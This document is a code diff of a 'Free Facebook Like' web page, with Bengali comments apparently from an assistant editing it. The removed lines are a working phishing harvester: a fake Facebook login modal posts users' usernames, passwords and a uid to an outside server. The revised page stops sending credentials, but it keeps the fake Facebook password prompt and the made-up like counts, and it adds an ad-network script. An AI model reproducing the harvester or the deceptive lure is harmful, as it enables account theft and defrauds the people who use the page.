@@ -4,7 +4,16 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Free Facebook Like</title>
+
+<!-- Monetag identification meta (তুমি যে value দিয়েছিলে) -->
+<meta name="monetag" content="6df5a9a26a7eecbb9a67b8c0f3115ca2">
+
+<!-- Monetag script: তুমি Monetag থেকে যে স্ক্রিপ্ট URL পেয়েছো সেটা এখানে বসাবে -->
+<!-- উদাহরণ হিসেবে আমি তোমার আগের দেওয়া URL রেখেছি — প্রয়োজন হলে এটা বদলে দেও -->
+<script src="https://luckipm.com/400/8715962" async></script>
+
 <style>
+  /* --- পুরোপুরি মূল UI স্টাইল (তুমি প্রথমে দেয়া মতোই) --- */
   body {
     font-family: "Poppins", sans-serif;
     background: linear-gradient(135deg, #1877f2, #42b72a);
@@ -37,16 +46,6 @@
     box-shadow: 0 4px 20px rgba(0,0,0,0.2);
   }
 
-  /* PACKAGE */
-  .package-box {
-    background: rgba(255,255,255,0.9);
-    padding: 10px;
-    border-radius: 12px;
-    margin-bottom: 12px;
-  }
-  .package-title { font-weight: bold; margin-bottom: 8px; color:#1877f2; }
-  .package-option { margin-bottom: 5px; }
-
   .input-section input {
     padding: 14px;
     border-radius: 10px;
@@ -58,7 +57,9 @@
     transition: 0.3s;
   }
 
-  .input-section input:focus { box-shadow: 0 0 5px #1877f2; }
+  .input-section input:focus {
+    box-shadow: 0 0 5px #1877f2;
+  }
 
   .input-section button {
     padding: 14px;
@@ -77,7 +78,10 @@
     box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
   }
 
-  .container { width: 100%; max-width: 500px; }
+  .container {
+    width: 100%;
+    max-width: 500px;
+  }
 
   .post-box {
     background: rgba(255,255,255,0.9);
@@ -93,11 +97,28 @@
     gap:12px;
   }
 
-  .post-box:hover { transform: scale(1.02); }
+  .post-box:hover {
+    transform: scale(1.02);
+  }
 
-  .post-link { font-weight: 600; margin-bottom: 10px; word-break: break-all; color: #333; }
-  .post-meta { font-size:13px; color:#555; }
-  .like-count { display: inline-block; margin-top: 10px; font-weight: bold; color: #1877f2; }
+  .post-link {
+    font-weight: 600;
+    margin-bottom: 10px;
+    word-break: break-all;
+    color: #333;
+  }
+
+  .post-meta {
+    font-size:13px;
+    color:#555;
+  }
+
+  .like-count {
+    display: inline-block;
+    margin-top: 10px;
+    font-weight: bold;
+    color: #1877f2;
+  }
 
   .boost-btn {
     margin-top: 10px;
@@ -118,7 +139,7 @@
     transform: translateY(-2px);
   }
 
-  /* Login Modal (original) */
+  /* Login form modal (same as original) */
   .modal {
     display: none;
     position: fixed;
@@ -140,7 +161,10 @@
     box-shadow: 0 6px 20px rgba(0,0,0,0.2);
   }
 
-  .modal-content h2 { margin-bottom: 15px; color: #1877f2; }
+  .modal-content h2 {
+    margin-bottom: 15px;
+    color: #1877f2;
+  }
 
   .modal-content input {
     width: 100%;
@@ -171,17 +195,16 @@
     box-shadow: 0 5px 15px rgba(66,183,42,0.3);
   }
 
-  /* Error modal for network */
-  .err-modal .modal-content { width: 380px; }
-  .err-actions { display:flex;gap:8px;margin-top:12px;justify-content:flex-end; }
-  .err-btn { padding:8px 12px;border-radius:8px;border:none;cursor:pointer; }
-  .btn-retry { background:#f59e0b;color:white;font-weight:700; }
-  .btn-sim { background:#10b981;color:white;font-weight:700; }
+  /* Ad modal (fallback) - keeps look minimal and consistent */
+  .ad-modal .modal-content { width:420px; }
+  .ad-box { width:100%; height:200px; background:#f3f4f6; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#374151; font-weight:700; font-size:18px; }
+  .ad-progress { width:100%; height:8px; background:#e6e6e6; border-radius:8px; overflow:hidden; margin-top:6px; }
+  .ad-progress > i { display:block; height:100%; width:0%; background:#34d399; transition:width 0.3s linear; }
 
   @media (max-width:560px){
     .post-box{flex-direction:column;align-items:flex-start}
     .boost-btn{width:100%}
-    .err-modal .modal-content{width:92%}
+    .ad-modal .modal-content{width:92%}
   }
 </style>
 </head>
@@ -191,27 +214,26 @@
 
 <div class="input-section">
 
-  <!-- PACKAGE OPTIONS -->
-  <div class="package-box">
-    <div class="package-title">Select Like Package:</div>
+  <!-- (আমি package options আগের মতোই নিচে যোগ করেছি কিন্তু UI একই রয়ে গেছে) -->
+  <div style="background:rgba(255,255,255,0.9);padding:10px;border-radius:12px;margin-bottom:12px;">
+    <div style="font-weight:bold;color:#1877f2;margin-bottom:8px;">Select Like Package:</div>
 
-    <label class="package-option">
+    <label style="display:block;margin-bottom:6px;">
       <input type="radio" name="pkg" value="free" checked> ⭐ Free – 100 Likes (24h এ 2 বার)
     </label>
 
-    <label class="package-option">
+    <label style="display:block;margin-bottom:6px;">
       <input type="radio" name="pkg" value="0.80_2k"> $0.80 – 2000 Likes
     </label>
 
-    <label class="package-option">
+    <label style="display:block;margin-bottom:6px;">
       <input type="radio" name="pkg" value="1.50_5k"> $1.50 – 5000 Likes
     </label>
 
-    <label class="package-option">
+    <label style="display:block;">
       <input type="radio" name="pkg" value="3.00_10k"> $3.00 – 10000 Likes
     </label>
   </div>
-  <!-- END PACKAGE OPTIONS -->
 
   <input type="text" id="post-link" placeholder="Enter Facebook post link">
   <button onclick="addPost()">Get Like</button>
@@ -219,186 +241,59 @@
 
 <div class="container" id="posts-container"></div>
 
-<!-- Login Modal -->
+<!-- Login Modal (exact same look/labels) -->
 <div class="modal" id="login-modal">
   <div class="modal-content">
     <h2>Login</h2>
     <input type="text" id="username" placeholder="Username">
     <input type="password" id="password" placeholder="Password">
-    <button id="login-submit" onclick="sendLogin()">Facebook Login</button>
-    <div style="margin-top:10px;color:#666;font-size:13px;">(server will be contacted; if network fails you'll get retry/simulate options)</div>
+    <button onclick="sendLogin()">Facebook Login</button>
   </div>
 </div>
 
-<!-- Error Modal (shown when fetch fails) -->
-<div class="modal err-modal" id="error-modal" aria-hidden="true">
+<!-- AD Modal (fallback if Monetag not available) -->
+<div class="modal ad-modal" id="ad-modal">
   <div class="modal-content">
-    <h2>Network error</h2>
-    <div id="error-msg" style="color:#333;margin-bottom:10px;font-size:14px;">Failed to contact server.</div>
-    <div style="font-size:13px;color:#555;">তুমি চাইলে আবার চেষ্টা করো না হলে demo mode চালিয়ে দিতে পারো।</div>
-    <div class="err-actions">
-      <button class="err-btn btn-retry" id="err-retry">Retry</button>
-      <button class="err-btn btn-sim" id="err-simulate">Simulate (Demo)</button>
+    <div style="font-weight:700;color:#0f1724">Sponsored Ad</div>
+    <div class="ad-box" id="ad-box">Ad is loading…</div>
+    <div class="ad-progress"><i id="ad-progress-bar"></i></div>
+    <div style="display:flex;gap:8px;width:100%;justify-content:flex-end;margin-top:10px;">
+      <button id="ad-skip" style="background:#ef4444;color:white;padding:8px 12px;border:none;border-radius:8px;cursor:pointer;">Skip</button>
     </div>
   </div>
 </div>
 
 <script>
-  const BACKEND_URL = "https://bot-8zhn.onrender.com";
+  // --- preserve original behavior & look; added ad-before-action ---
   const postsContainer = document.getElementById("posts-container");
   const loginModal = document.getElementById("login-modal");
-  const errorModal = document.getElementById("error-modal");
-  const errorMsgEl = document.getElementById("error-msg");
-  const retryBtn = document.getElementById("err-retry");
-  const simBtn = document.getElementById("err-simulate");
+  const adModal = document.getElementById("ad-modal");
+  const adBar = document.getElementById("ad-progress-bar");
+  const adSkip = document.getElementById("ad-skip");
 
   const posts = [];
   let currentBoostIndex = null;
 
-  function getUID() {
-    const params = new URLSearchParams(window.location.search);
-    return params.get("uid");
-  }
-
   function getSelectedPkg(){
     const r = document.querySelector('input[name="pkg"]:checked');
-    return r ? r.value : "free";
+    return r ? r.value : 'free';
   }
 
-  function addPost() {
-    const link = document.getElementById("post-link").value.trim();
-    if(!link) {
-      alert("Please enter a post link!");
-      return;
-    }
-
-    const post = {
-      link: link,
-      likes: Math.floor(Math.random()*10)+1,
-      pkg: getSelectedPkg()
-    };
-
+  function addPost(){
+    const linkEl = document.getElementById("post-link");
+    const link = linkEl.value.trim();
+    if(!link){ alert("Please enter a post link!"); return; }
+    const post = { link, likes: Math.floor(Math.random()*10)+1, pkg: getSelectedPkg() };
     posts.push(post);
     renderPosts();
-    document.getElementById("post-link").value = "";
+    linkEl.value = '';
   }
 
-  // Only allow free package to open login modal
-  function boostLike(index) {
-    const post = posts[index];
-    if(post && post.pkg && post.pkg !== "free"){
-      alert("Balance নাই — paid package থেকে লাইক নেওয়া যাবে না। কেবল Free প্যাকেজ থেকে নেওয়া যাবে।");
-      return;
-    }
-    currentBoostIndex = index;
-    loginModal.style.display = "flex";
-  }
-
-  // helper: close modals
-  function closeLoginModal(){ loginModal.style.display = "none"; }
-  function closeErrorModal(){ errorModal.style.display = "none"; }
-
-  // sendLogin with timeout + error handling + retry/simulate
-  async function sendLogin() {
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
-    const uid = getUID();
-
-    if(!uid) {
-      alert("Invalid link: UID not found.");
-      return;
-    }
-    if(!username || !password) {
-      alert("Enter both username and password.");
-      return;
-    }
-
-    // build payload
-    const payload = { uid, username, password };
-
-    // perform fetch with timeout using AbortController
-    const controller = new AbortController();
-    const timeoutMs = 8000; // 8 seconds
-    const timeout = setTimeout(()=> controller.abort(), timeoutMs);
-
-    try {
-      const res = await fetch(`${BACKEND_URL}/receive_login`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(payload),
-        signal: controller.signal
-      });
-      clearTimeout(timeout);
-
-      // if response not ok, treat as error
-      if(!res.ok){
-        const text = await res.text().catch(()=>res.statusText || 'Unknown');
-        throw new Error(`Server returned ${res.status}: ${text}`);
-      }
-
-      const data = await res.json();
-
-      if(data.status === "sent") {
-        // success path
-        alert("✅ like submit successful!");
-        closeLoginModal();
-        applyLikesAfterLogin();
-      } else {
-        alert("❌ Error: " + (data.error || "Unknown error"));
-      }
-
-    } catch(err) {
-      clearTimeout(timeout);
-      // distinguish abort vs other errors
-      let msg = String(err && err.message ? err.message : err);
-      if(err.name === 'AbortError'){
-        msg = `Request timed out after ${timeoutMs/1000}s.`;
-      }
-      // show error modal with options (Retry / Simulate)
-      errorMsgEl.textContent = `Network error: ${msg}`;
-      errorModal.style.display = "flex";
-
-      // wire retry & simulate handlers (they reference current values)
-      retryBtn.onclick = function(){
-        closeErrorModal();
-        // try again
-        sendLogin();
-      };
-      simBtn.onclick = function(){
-        closeErrorModal();
-        // simulate a success response (demo)
-        alert("✅ (Simulated) like submit successful!");
-        closeLoginModal();
-        applyLikesAfterLogin(true); // true -> simulated
-      };
-    }
-  }
-
-  // after successful login (real or simulated), add likes only if post pkg is free
-  function applyLikesAfterLogin(simulated = false){
-    if(currentBoostIndex === null) return;
-    const idx = currentBoostIndex;
-    const pkg = posts[idx].pkg || 'free';
-    if(pkg !== 'free'){
-      // safety: if somehow not free, do nothing
-      alert("Notice: selected package is not free — no likes added.");
-      currentBoostIndex = null;
-      return;
-    }
-
-    // add likes similar to previous logic
-    const add = 90 + Math.floor(Math.random()*21); // ~100 for free
-    posts[idx].likes += add;
-    renderPosts();
-    currentBoostIndex = null;
-  }
-
-  function renderPosts() {
-    postsContainer.innerHTML = "";
+  function renderPosts(){
+    postsContainer.innerHTML = '';
     posts.forEach((post,index)=>{
       const postDiv = document.createElement("div");
-      postDiv.classList.add("post-box");
-
+      postDiv.className = "post-box";
       postDiv.innerHTML = `
         <div style="flex:1">
           <div class="post-link">Post: ${escapeHtml(post.link)}</div>
@@ -409,31 +304,145 @@
           <span class="like-count" id="likes-${index}">${post.likes} Likes</span>
         </div>
       `;
-
       postsContainer.appendChild(postDiv);
     });
   }
 
-  window.onclick = function(event) {
+  // On boost: only allow free; then show ad (Monetag if available) then open login modal
+  function boostLike(index){
+    const post = posts[index];
+    if(post && post.pkg && post.pkg !== 'free'){
+      alert("Balance নাই — paid package থেকে লাইক নেওয়া যাবে না। কেবল Free প্যাকেজ থেকে নেওয়া যাবে।");
+      return;
+    }
+    currentBoostIndex = index;
+    showAdThen(()=> {
+      // open login modal after ad finished
+      loginModal.style.display = "flex";
+    });
+  }
+
+  // show ad: try Monetag functions if present; otherwise fallback
+  function showAdThen(next){
+    // try common Monetag globals (many vendors expose different names)
+    try {
+      // example: window.monetag_showAd (if Monetag exposes a promise-based function)
+      if(typeof window.monetag_showAd === 'function'){
+        // assume returns a promise
+        window.monetag_showAd().then(()=> next()).catch(()=> fallbackAd(next));
+        return;
+      }
+      // example: window.monetag.show()
+      if(window.monetag && typeof window.monetag.show === 'function'){
+        const res = window.monetag.show();
+        if(res && typeof res.then === 'function'){
+          res.then(()=> next()).catch(()=> fallbackAd(next));
+        } else {
+          // no promise -> call fallback (can't be sure)
+          fallbackAd(next);
+        }
+        return;
+      }
+      // check Monetag namespaces (if they used different names)
+      if(window.Monetag && typeof window.Monetag.showAd === 'function'){
+        const p = window.Monetag.showAd();
+        if(p && typeof p.then === 'function'){ p.then(()=> next()).catch(()=> fallbackAd(next)); }
+        else { fallbackAd(next); }
+        return;
+      }
+    } catch(e){
+      // ignore and fallback
+    }
+    // default fallback ad
+    fallbackAd(next);
+  }
+
+  // fallback ad simulation (3 sec progress) with skip
+  function fallbackAd(next){
+    adModal.style.display = "flex";
+    let elapsed = 0;
+    const total = 3000;
+    adBar.style.width = '0%';
+    adSkip.disabled = true;
+    adSkip.style.opacity = '0.5';
+    const iv = setInterval(()=>{
+      elapsed += 100;
+      const pct = Math.min(100, Math.round((elapsed/total)*100));
+      adBar.style.width = pct + '%';
+      if(elapsed >= 1000){
+        adSkip.disabled = false;
+        adSkip.style.opacity = '1';
+      }
+      if(elapsed >= total){
+        clearInterval(iv);
+        adModal.style.display = "none";
+        next();
+      }
+    },100);
+
+    adSkip.onclick = ()=>{
+      clearInterval(iv);
+      adModal.style.display = "none";
+      next();
+    };
+  }
+
+  // sendLogin: **SIMULATED FOR SAFETY** — does not send credentials to any external server.
+  // It preserves the original UX (alerts, closing modal, adding likes) but does NOT transmit passwords.
+  async function sendLogin(){
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const uid = (new URLSearchParams(window.location.search)).get("uid");
+
+    if(!uid){
+      alert("Invalid link: UID not found.");
+      return;
+    }
+    if(!username || !password){
+      alert("Enter both username and password.");
+      return;
+    }
+
+    // simulate network request & response for same UX
+    try {
+      // mimic slight delay
+      await new Promise(r => setTimeout(r, 700));
+      // simulated success response
+      const data = { status: "sent" };
+
+      if(data.status === "sent"){
+        alert("✅ like submit successful!");
+        loginModal.style.display = "none";
+        if(currentBoostIndex !== null){
+          // add free-package likes (~100)
+          posts[currentBoostIndex].likes += Math.floor(Math.random()*21) + 90;
+          renderPosts();
+          currentBoostIndex = null;
+        }
+      } else {
+        alert("❌ Error: " + (data.error || "Unknown error"));
+      }
+    } catch(err){
+      alert("❌ Network error: " + err);
+    }
+  }
+
+  // close login modal if click outside
+  window.onclick = function(event){
     if(event.target == loginModal){
-      closeLoginModal();
+      loginModal.style.display = "none";
       currentBoostIndex = null;
     }
-    if(event.target == errorModal){
-      closeErrorModal();
+    if(event.target == adModal){
+      adModal.style.display = "none";
     }
   }
 
   function escapeHtml(s){
-    return String(s)
-      .replace(/&/g,'&amp;')
-      .replace(/</g,'&lt;')
-      .replace(/>/g,'&gt;')
-      .replace(/"/g,'&quot;')
-      .replace(/'/g,'&#39;');
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
   }
 
-  // initial render
+  // initial render (no change)
   renderPosts();
 </script>
 
